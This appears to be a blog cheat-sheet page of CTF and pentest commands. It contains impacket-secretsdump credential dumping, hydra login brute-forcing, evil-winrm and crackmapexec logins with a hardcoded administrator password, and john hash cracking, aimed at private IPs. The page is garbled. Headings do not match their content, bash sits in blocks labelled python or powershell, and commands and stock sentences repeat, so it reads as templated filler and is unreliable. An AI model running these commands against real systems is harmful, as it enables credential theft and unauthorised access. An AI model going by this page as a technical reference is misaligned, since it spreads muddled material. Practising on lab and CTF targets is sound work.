---
TitleSEO: "Common CTF Tricks and Techniques | ZureFX"
TitlePost: "Common CTF Tricks and Techniques"
Author: "ZureFX"
Description: "Personal notes on Common CTF Tricks and Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, oscp, malware, persistence"
URL: "https://zurefx.github.io/notes/note-common-ctf-tricks-and-techniques-923.html"
URL_IMAGES: ""
Date: "2024-09-14"
Tags: "DFIR, OSCP, Malware, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-common-ctf-tricks-and-techniques-923"
Permalink: "/notes/note-common-ctf-tricks-and-techniques-923.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Flask

### AS-REP Roasting

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.23.98.202
impacket-secretsdump administrator:'P@ssw0rd!'@10.98.34.97
```

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.37.109.3 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.22.220.193/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.10.225.157
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.126.97
```

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

> **Note:** SUID Binary was identified as the primary attack vector in this scenario.

## burpsuite

### WinRM

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.48.235
```

- `LAPS Abuse`
- `evil-winrm`
- `netcat`
- `crackmapexec`
- `dcomexec`

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.158.89/FUZZ
evil-winrm -i 10.63.27.235 -u administrator -p 'P@ssw0rd!'
```

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.21.33.97 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.79.181.228 -u administrator -p 'P@ssw0rd!'
```

## Kerberoasting

### nikto

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.136.24 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.21.157.130 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.48.30 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

- `AS-REP Roasting`
- `socat`
- `gobuster`
- `dcomexec`
- `rubeus`
- `enum4linux`

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.152.48 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## AlwaysInstallElevated

### Subdomain Takeover

```powershell
feroxbuster -h
crackmapexec smb 10.45.5.130 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.63.100.135 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.120.99.132 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).
